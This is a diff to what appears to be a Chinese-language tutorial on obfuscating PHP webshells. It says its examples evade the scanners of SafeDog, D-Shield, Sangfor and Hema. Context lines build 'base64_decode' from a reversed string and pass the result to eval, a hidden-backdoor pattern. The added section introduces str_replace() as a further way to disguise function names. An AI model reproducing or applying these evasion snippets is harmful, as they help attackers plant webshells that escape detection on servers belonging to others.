@@ -97,7 +97,7 @@ eval($e);
  >以下的例子均可以绕过绕过安全狗、D盾和深信服的客户端Webshell查杀和河马正式版的查杀。  
  
  ### strrev()函数
- `strrev()` 函数反转字符串。  
+ **strrev()** 函数反转字符串。  
  ```php
  <?php
 echo strrev("s9mf");
@@ -112,7 +112,14 @@ $a = strrev('EdOcEd_46eSaB');  // base64_decode
 $b= $a('code');
 eval($b);
  ```
-
+### str_replace()函数
+**str_replace()** 函数替换字符串中的一些字符(区分大小写)
+```
+<?php
+echo str_replace("ok","","emokmmokmokm"); 
+```
+输出:  
+![13](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r5hzfjzzj30fw05pmxr.jpg)
 
 
 
